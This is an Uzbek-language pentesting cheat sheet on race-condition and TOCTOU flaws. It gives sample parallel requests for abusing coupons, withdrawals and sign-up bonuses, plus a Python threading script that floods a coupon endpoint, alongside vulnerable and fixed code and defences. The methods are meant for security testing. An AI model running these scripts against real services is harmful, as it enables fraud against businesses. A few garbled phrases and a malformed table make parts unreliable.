# Race Condition / TOCTOU

## 1. Ta'rif
Race condition — ikki yoki undan ko'p so'rov bir vaqtda serverda o'qish-va-yozish (check-then-act) orqali fayl/saldo/coupon'ni takroran ishlatadi. TOCTOU — tekshirish va foydalanish orasidagi bo'shliq.

## 2. Qayerdan kelib chiqadi
- Coupon/promo bir necha marta apply (limit check + use alohida)
- Withdraw/transfer: saldo check keyin decrement — bir vaqtda 2 so'rov qo`shimcha pul
- Upload race: check virsci keyin rename/access qilish
- Ticket/seat booking: limit 1 → parallel book 100
- Like/saved: qayta like `LIKE IN (user_id, post_id)` unique yo'q
- ID-based rate limits: sign-up bonus bir necha marta
- 2FA/session: single-use token — parallel ishlatish

## 3. Turlari
| Tur | Xulq |
|-----|--------|
| Single-packet race (HTTP/2 | same TCP/ip parallel) |
| Turbo Intruder / race | flood of reps |
| TOCTOU (time gap) | check then act |
| Visual-brow limits | DOM/browser |
| Database row lock yo'q | unique constraint yo'q |

## 4. Metodologiya
1. State-changing endpoint — bir nechta so'rov yuboriladigan: coupon apply, withdraw, booking, transfer.
2. Oddiy bir so'rov ishlaydi; qancha ishlatganda state o'zgaradi — keyoqlab 10, 50 parallel yuboring.
3. Single-packet attack (HTTP/2):
   - `Content-Length` birinchi, `smuggling` bor yoki HTTP/2 multiplex
   - `Turbo Intruder` Python — parallel `engine.queue(...)`.
   - Repeater: request'ni hammasini send guruhlab (Burp Race/single-packet attack).
4. Response'larni kuzat: nechta marta code qabul qilindi / like soni nechta / withdraw nechta.
5. TOCTOU upload: bir nechta fayl nomi bir xil — check oldin access keyin.

## 5. Request misollari
```
# Coupon parallel apply (Turbo Intruder)
POST /api/apply HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
body: code=SAVE50
# 20-raqam parallel — nechta marta 50% qo'llandi?

# Withdraw race
POST /api/withdraw HTTP/1.1
{"amount": 1000}
# 2x parallel — saldo 1 marta tushdi, 2 marta chiqdi

# Registration bonus
POST /api/register HTTP/1.1
{"phone": "+9989..."}
# 2x parallel -> ikki bonus
```
## 6. Turli bat metod (python requests):
```python
import requests, threading
url="https://target.com/api/apply"
def hit():
    r=requests.post(url, data={"code":"SAVE50"}, cookies={"session":"..."})
    print(r.status_code)
ts=[threading.Thread(target=hit) for _ in range(30)]
[t.start() for t in ts]; [t.join() for t in ts]
```
## 7. Zaif code misollari
```python
# ZAIF — check then act race
if item.stock >= 1:
    time.sleep(0.1)          # gap!
    item.stock -= 1
    item.save()
# XAVFSIZ:
from django.db import transaction
with transaction.atomic():
    # select_for_update() yoki atomic decrement
    Item.objects.filter(pk=item.pk, stock__gte=1).update(stock=F('stock')-1)

# PHP — coupon zaif
if coupon_used($code) == false:
    apply_coupon($code); # race foydasiz unique check yo'q
```
## 8. Nimalarga ahamiyat berish (checklist)
- [ ] Har bir single-use/one-time endpoint — parallel qiling
- [ ] Liken/save/coupon/booking/reg bonus, transfer, video-credit
- [ ] TOCTOU: file check → read; email verify → send
- [ ] DB unique constraint yo'qmi (repeat rows)
- [ ] Session/token single-use — parallel buyon qilish
- [ ] HTTP/2 single-packet (goat) — optimize
- [ ] Observ: response'da limit oshganmi — sonini qidir
## 9. Himoya
- Atomic transactions / `SELECT ... FOR UPDATE`
- Unique constraints DB'da; iddle-specific token'i single-use with unique lock
- Idempotency keys, redis lock, `SETNX`
- Application single-flight